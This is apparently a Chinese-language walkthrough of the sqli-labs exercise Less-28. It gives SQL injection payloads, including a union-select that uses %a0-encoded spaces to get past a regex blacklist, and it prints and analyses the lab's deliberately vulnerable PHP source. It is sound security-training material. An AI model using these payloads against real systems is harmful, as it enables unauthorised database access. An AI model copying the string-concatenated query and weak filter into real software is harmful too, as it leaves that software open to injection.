# Less-28 **GET Trick with SELECT & UNION**  
## 漏洞利用
单独输入一个单引号时并没有错误信息显示，这说明此页面关闭了错误回显  
![less28_1](images\less28_1.png) 
   
仿照less26a,27a的方法进行参数类型的测试  
Payload:```?id=1"```    
![less28_2](images\less28_2.png) 
可知参数为字符型  
  
测试是否被小括号包裹  
Payload:```?id=1')||'1'=('1```
![less28_3](images\less28_3.png)  
出现了正确回显说明参数被小括号包裹了  
  
构建获取回显点payload:```?id=0')%a0union%a0select%a01,2,3;%00```
![less28_4](images\less28_4.png)    
虽然页面上说union和select被过滤，但是并直接的输入没有触发过滤器工作,将在下一部分介绍为什么过滤器没有工作  

## 源码分析  
### less28源码： 
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-28 Trick with SELECT & UNION</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:40px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");

// take the variables 
if(isset($_GET['id']))
{
	$id=$_GET['id'];
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id."\n");
	fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;

// connectivity 
	$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
	$result=mysqli_query($con1, $sql);
	$row = mysqli_fetch_array($result, MYSQLI_BOTH);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		//print_r(mysqli_error($con1));
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
$id= preg_replace('/[--]/',"", $id);				//Strip out --.
$id= preg_replace('/[#]/',"", $id);					//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
return $id;
}



?>
</font> </div></br></br></br><center>
<img src="../images/Less-28.jpg" />
</br>
</br>
</br>
<img src="../images/Less-28-1.jpg" />
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: Your Input is Filtered with following result: ".$hint;
?>
</font> 
</center>
</body>
</html>
```
### 漏洞点分析
看起来此less的过滤器并没有正常工作，当审阅页面代码中的过滤器部分时
```
function blacklist($id)
{
    $id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
    $id= preg_replace('/[--]/',"", $id);				//Strip out --.
    $id= preg_replace('/[#]/',"", $id);					//Strip out #.
    $id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
    //$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
    $id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
    $id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
    return $id;
}
```
可以发现和前几个less相似，它使用了```preg_replace()```来进行正则匹配过滤，但不知为何，用于单独过滤```select```的语句被注释掉了，只留下了过滤```union select```组合的语句  
虽然```\s```匹配任意空格、制表符、换行符等空白字符，但可以被编码绕过，这导致了当使用编码```%a0```来填充空格时过滤器会被欺骗无法正常工作  